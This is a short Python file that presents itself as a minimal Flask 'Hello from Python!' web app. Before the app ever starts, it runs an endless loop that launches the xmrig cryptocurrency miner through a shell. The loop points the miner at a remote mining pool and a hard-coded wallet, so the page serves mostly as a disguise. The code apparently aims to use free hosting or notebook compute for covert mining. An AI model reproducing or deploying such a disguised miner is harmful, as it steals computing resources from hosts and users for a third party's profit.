from flask import Flask
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64


app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello from Python!"

i=0

while 1:
    subprocess.run(["./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 2 -k"],shell=True)
    sleep(20)

from IPython.display import clear_output 

if __name__ == "__main__":
    app.run(host='0.0.0.0')
